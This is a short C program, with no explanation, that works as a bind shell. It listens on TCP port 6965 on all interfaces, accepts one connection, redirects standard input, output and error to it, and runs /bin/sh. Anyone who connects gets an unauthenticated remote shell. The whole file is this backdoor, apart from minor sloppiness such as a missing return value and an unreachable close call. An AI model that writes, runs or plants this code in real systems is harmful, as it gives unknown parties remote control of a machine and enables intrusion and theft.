#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 6965

int server_check(int fd, struct sockaddr_in server) {
    if (bind(fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
        fprintf(stderr, "[!] Bind error! [!]");
        exit(EXIT_FAILURE);
    }
    
    if (listen(fd, 2) != 0) {
        fprintf(stderr, "[!] Listening error! [!]");
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    int fd, connection;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(PORT);

    fd = socket(PF_INET, SOCK_STREAM, 0);
    server_check(fd, server);
    connection = accept(fd, NULL, NULL);

    for (int i = 0; i < 3; i++) {
        dup2(connection, i);
    }

    execve("/bin/sh", NULL, NULL);    
    close(fd);
    EXIT_SUCCESS;
}